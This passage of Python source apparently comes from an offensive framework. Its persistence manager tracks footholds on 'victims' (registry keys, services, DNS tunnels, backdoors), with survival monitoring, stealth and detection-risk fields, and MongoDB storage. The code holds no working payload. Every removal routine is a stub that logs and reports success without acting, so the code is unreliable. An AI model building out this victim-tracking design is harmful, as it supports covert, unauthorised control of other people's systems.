            persistence_type = mechanism.persistence_type
            
            if persistence_type == PersistenceType.REGISTRY:
                return self._remove_registry_persistence(mechanism)
            elif persistence_type == PersistenceType.SCHEDULED_TASK:
                return self._remove_scheduled_task_persistence(mechanism)
            elif persistence_type == PersistenceType.STARTUP_FOLDER:
                return self._remove_startup_folder_persistence(mechanism)
            elif persistence_type == PersistenceType.SERVICE:
                return self._remove_service_persistence(mechanism)
            elif persistence_type == PersistenceType.BROWSER_EXTENSION:
                return self._remove_browser_extension_persistence(mechanism)
            elif persistence_type == PersistenceType.COOKIE_PERSISTENCE:
                return self._remove_cookie_persistence(mechanism)
            elif persistence_type == PersistenceType.LOCAL_STORAGE:
                return self._remove_local_storage_persistence(mechanism)
            elif persistence_type == PersistenceType.WEBSOCKET_CONNECTION:
                return self._remove_websocket_persistence(mechanism)
            elif persistence_type == PersistenceType.DNS_TUNNEL:
                return self._remove_dns_tunnel_persistence(mechanism)
            elif persistence_type == PersistenceType.BACKDOOR:
                return self._remove_backdoor_persistence(mechanism)
            else:
                logger.error(f"Unknown persistence type: {persistence_type}")
                return False
                
        except Exception as e:
            logger.error(f"Error removing persistence mechanism: {e}")
            return False
    
    def _remove_registry_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove registry persistence"""
        try:
            logger.info(f"Removing registry persistence: {mechanism.mechanism_id}")
            # In real implementation, remove registry entries
            return True
            
        except Exception as e:
            logger.error(f"Error removing registry persistence: {e}")
            return False
    
    def _remove_scheduled_task_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove scheduled task persistence"""
        try:
            logger.info(f"Removing scheduled task persistence: {mechanism.mechanism_id}")
            # In real implementation, delete scheduled task
            return True
            
        except Exception as e:
            logger.error(f"Error removing scheduled task persistence: {e}")
            return False
    
    def _remove_startup_folder_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove startup folder persistence"""
        try:
            logger.info(f"Removing startup folder persistence: {mechanism.mechanism_id}")
            # In real implementation, delete startup file
            return True
            
        except Exception as e:
            logger.error(f"Error removing startup folder persistence: {e}")
            return False
    
    def _remove_service_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove service persistence"""
        try:
            logger.info(f"Removing service persistence: {mechanism.mechanism_id}")
            # In real implementation, uninstall service
            return True
            
        except Exception as e:
            logger.error(f"Error removing service persistence: {e}")
            return False
    
    def _remove_browser_extension_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove browser extension persistence"""
        try:
            logger.info(f"Removing browser extension persistence: {mechanism.mechanism_id}")
            # In real implementation, uninstall extension
            return True
            
        except Exception as e:
            logger.error(f"Error removing browser extension persistence: {e}")
            return False
    
    def _remove_cookie_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove cookie persistence"""
        try:
            logger.info(f"Removing cookie persistence: {mechanism.mechanism_id}")
            # In real implementation, delete cookie
            return True
            
        except Exception as e:
            logger.error(f"Error removing cookie persistence: {e}")
            return False
    
    def _remove_local_storage_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove local storage persistence"""
        try:
            logger.info(f"Removing local storage persistence: {mechanism.mechanism_id}")
            # In real implementation, clear local storage
            return True
            
        except Exception as e:
            logger.error(f"Error removing local storage persistence: {e}")
            return False
    
    def _remove_websocket_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove WebSocket persistence"""
        try:
            logger.info(f"Removing WebSocket persistence: {mechanism.mechanism_id}")
            # In real implementation, close WebSocket connection
            return True
            
        except Exception as e:
            logger.error(f"Error removing WebSocket persistence: {e}")
            return False
    
    def _remove_dns_tunnel_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove DNS tunnel persistence"""
        try:
            logger.info(f"Removing DNS tunnel persistence: {mechanism.mechanism_id}")
            # In real implementation, stop DNS tunnel
            return True
            
        except Exception as e:
            logger.error(f"Error removing DNS tunnel persistence: {e}")
            return False
    
    def _remove_backdoor_persistence(self, mechanism: PersistenceMechanism) -> bool:
        """Remove backdoor persistence"""
        try:
            logger.info(f"Removing backdoor persistence: {mechanism.mechanism_id}")
            # In real implementation, stop backdoor
            return True
            
        except Exception as e:
            logger.error(f"Error removing backdoor persistence: {e}")
            return False
    
    def _start_persistence_monitoring(self, mechanism_id: str):
        """Start monitoring persistence mechanism"""
        try:
            monitor_thread = threading.Thread(
                target=self._monitor_persistence_mechanism,
                args=(mechanism_id,),
                daemon=True
            )
            monitor_thread.start()
            
            self.check_threads[mechanism_id] = monitor_thread
            
        except Exception as e:
            logger.error(f"Error starting persistence monitoring: {e}")
    
    def _monitor_persistence_mechanism(self, mechanism_id: str):
        """Monitor specific persistence mechanism"""
        try:
            while mechanism_id in self.persistence_mechanisms:
                mechanism = self.persistence_mechanisms[mechanism_id]
                
                if mechanism.status == PersistenceStatus.ACTIVE:
                    # Check survival
                    check_result = self.check_persistence_survival(mechanism_id)
                    
                    if check_result and check_result.status == "inactive":
                        logger.warning(f"Persistence mechanism compromised: {mechanism_id}")
                        mechanism.status = PersistenceStatus.COMPROMISED
                
                # Wait before next check
                time.sleep(300)  # Check every 5 minutes
                
        except Exception as e:
            logger.error(f"Error monitoring persistence mechanism: {e}")
    
    def _monitor_survival(self):
        """Main survival monitoring loop"""
        try:
            while True:
                # Check all active persistence mechanisms
                for mechanism_id in list(self.persistence_mechanisms.keys()):
                    mechanism = self.persistence_mechanisms[mechanism_id]
                    
                    if mechanism.status == PersistenceStatus.ACTIVE:
                        # Perform survival check
                        check_result = self.check_persistence_survival(mechanism_id)
                        
                        if check_result and check_result.status == "inactive":
                            logger.warning(f"Persistence mechanism compromised: {mechanism_id}")
                            mechanism.status = PersistenceStatus.COMPROMISED
                
                # Wait before next monitoring cycle
                time.sleep(600)  # Check every 10 minutes
                
        except Exception as e:
            logger.error(f"Error in survival monitoring loop: {e}")
    
    def _store_persistence_mechanism(self, mechanism: PersistenceMechanism):
        """Store persistence mechanism in database"""
        try:
            if self.mongodb:
                collection = self.mongodb.persistence_mechanisms
                doc = asdict(mechanism)
                doc["created_at"] = mechanism.created_at
                doc["last_checked"] = mechanism.last_checked
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing persistence mechanism: {e}")
    
    def _update_persistence_mechanism(self, mechanism: PersistenceMechanism):
        """Update persistence mechanism in database"""
        try:
            if self.mongodb:
                collection = self.mongodb.persistence_mechanisms
                doc = asdict(mechanism)
                doc["last_checked"] = mechanism.last_checked
                collection.update_one(
                    {"mechanism_id": mechanism.mechanism_id},
                    {"$set": doc}
                )
                
        except Exception as e:
            logger.error(f"Error updating persistence mechanism: {e}")
    
    def _store_persistence_check(self, check: PersistenceCheck):
        """Store persistence check result"""
        try:
            if self.mongodb:
                collection = self.mongodb.persistence_checks
                doc = asdict(check)
                doc["timestamp"] = check.timestamp
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing persistence check: {e}")
    
    def get_persistence_status(self, victim_id: str) -> Dict[str, Any]:
        """Get persistence status for victim"""
        try:
            if victim_id in self.active_mechanisms:
                mechanism_id = self.active_mechanisms[victim_id]
                mechanism = self.persistence_mechanisms[mechanism_id]
                
                return {
                    "victim_id": victim_id,
                    "mechanism_id": mechanism_id,
                    "persistence_type": mechanism.persistence_type.value,
                    "status": mechanism.status.value,
                    "stealth_level": mechanism.stealth_level,
                    "detection_risk": mechanism.detection_risk,
                    "last_checked": mechanism.last_checked.isoformat(),
                    "survival_indicators": mechanism.survival_indicators
                }
            
            return {"victim_id": victim_id, "status": "no_persistence"}
            
        except Exception as e:
            logger.error(f"Error getting persistence status: {e}")
            return {"victim_id": victim_id, "status": "error", "error": str(e)}

# Global persistence manager instance
persistence_manager = None

def initialize_persistence_manager(mongodb_connection=None, redis_client=None) -> PersistenceManager:
    """Initialize persistence manager"""
    global persistence_manager
    persistence_manager = PersistenceManager(mongodb_connection, redis_client)
    return persistence_manager

def get_persistence_manager() -> PersistenceManager:
    """Get persistence manager instance"""
    global persistence_manager
    if persistence_manager is None:
        persistence_manager = PersistenceManager()
    return persistence_manager